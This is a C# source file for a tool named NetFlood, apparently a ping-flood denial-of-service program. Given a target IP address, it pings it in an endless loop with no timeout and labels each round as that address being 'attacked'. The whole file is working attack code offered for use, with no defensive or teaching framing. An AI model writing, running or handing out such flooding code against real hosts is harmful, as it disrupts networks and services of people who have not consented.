using System;
using System.Collections.Generic;
using System.Text;
using System.Net.NetworkInformation;

namespace NetFlood
{
    class Flood
    {
        public Flood(string ip)
        {
            decimal i = 0;
            Ping p = new Ping();
            PingReply reply;

            do{
                i++;
                try
                {
                    reply = p.Send(ip, 0);
                    if (reply.Status == IPStatus.Success)
                    {
                        Console.Write("(");
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.Write(i);
                        Console.ForegroundColor = ConsoleColor.White;
                        Console.Write(")");
                    }
                    else if (reply.Status == IPStatus.TimedOut)
                    {
                        Console.Write("(");
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.Write(i);
                        Console.ForegroundColor = ConsoleColor.White;
                        Console.Write(")");
                    }
                }
                catch
                {
                    Console.Write("(");
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.Write(i);
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.Write(")");
                }

                Console.ForegroundColor = ConsoleColor.White;
                Console.Write(" Refusenik (");
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.Write(ip);
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write(") attacked (Use ");
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.Write("Ctrl + C");
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine(" to Abort)");
            }while(true);
        }
    }
}
